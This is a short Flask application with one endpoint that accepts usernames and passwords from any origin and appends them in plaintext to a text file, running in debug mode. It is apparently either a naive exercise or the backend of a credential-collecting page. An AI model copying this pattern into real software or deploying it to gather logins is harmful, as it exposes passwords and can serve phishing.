from flask import Flask, request, jsonify
from flask_cors import CORS
app = Flask(__name__)
CORS(app)
@app.route('/save-credentials', methods=['POST'])
def save_credentials():
    data = request.get_json()  # Get JSON data sent with the POST request
    username = data['username']
    password = data['password']
    
    with open('credentials.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')
    
    return jsonify({'message': 'Credentials saved successfully!'})

if __name__ == '__main__':
    app.run(debug=True)
